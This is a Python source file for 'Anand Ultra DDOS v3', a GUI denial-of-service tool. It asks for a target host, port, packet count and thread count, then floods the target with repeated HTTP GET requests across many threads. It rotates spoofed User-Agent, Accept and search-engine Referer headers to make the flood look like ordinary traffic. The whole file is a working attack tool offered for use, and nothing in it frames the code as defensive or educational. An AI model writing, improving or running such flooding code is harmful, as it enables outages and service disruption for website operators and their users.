
# Anand Ultra DDOS v3
import easygui as eg
import socket
import random
import threading
import webbrowser as wb
import sys
import requests

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]

ref=['http://www.bing.com/search?q=',
'https://www.google.com.com/search/q=',
'https://duckduckgo.com/?q=',
'https://yahoo.com/search?p=',
'https://yandex.com/search/?text=']

acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]

def checknum(number):
    if number.isnumeric():
        return int(number)
    else:
        eg.msgbox("That was not a number.", "Anand Ultra DDOS v3")
        raise ZeroDivisionError

eg.msgbox("Welcome to Ultra DDOS v2!", "Anand Ultra DDOS v3")
while True:
    try:
        selection = eg.buttonbox("", "Anand Ultra DDOS v3", ["DDOS Attack", "Credits", "Exit"], image="logo.png")
        if selection == "logo.png":
            eg.msgbox("How is clicking pictures going to cause anything...", "Anand Ultra DDOS v3")
            wb.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        if selection == "Exit":
            sys.exit(0)
        if selection == "Credits":
            eg.msgbox("DDOS script written by UltraTechZ\nGUI script written by WalesWorksLtd", "Anand Ultra DDOS v3")
        if selection == "DDOS Attack":
            ip = eg.enterbox("Please enter your target. This is the website or IP address that you want to attack.", "Anand Ultra DDOS v3")
            if ip.strip() == "":
                eg.msgbox("You did not enter a target.", "Anand Ultra DDOS v3")
                raise ZeroDivisionError
            port = eg.enterbox("Please enter a port. 80 is most commonly used, but you can use any other valid port.", "Anand Ultra DDOS v3")
            port = checknum(port)
            pack = eg.enterbox("Please enter the number of packets you would like to send. More is better, but too many will crash your computer.", "Anand Ultra DDOS v3")
            pack = checknum(pack)
            thread = eg.enterbox("Please enter the number of threads you would like to send. This can be the same number as the packets.", "Anand Ultra DDOS v3")
            thread = checknum(thread)
            eg.msgbox("The attack will start once you press OK. It will keep going until all requested packets are sent.", "Anand Ultra DDOS v3")
            def start():
                global useragents, ref, acceptalln
                hh = random._urandom(3016)
                xx = int(0)
                useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
                accept = random.choice(acceptall)
                reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
                content    = "Content-Type: application/x-www-form-urlencoded\r\n"
                length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
                target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
                main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(ip),int(port)))
                s.send(str.encode(main_req))
                for i in range(pack):
                    s.send(str.encode(main_req))
                    xx += random.randint(0, int(pack))
                    print("Attacking {0}:{1} | Sent: {2} packets\n".format(str(ip), int(port), xx))
                s.close()
            for x in range(thread):
                thred = threading.Thread(target=start)
                thred.start()
            eg.msgbox("All requested packets have been sent to the target!", "Anand Ultra DDOS v3")
    except:
        if selection == "Exit":
            sys.exit(0)
        pass



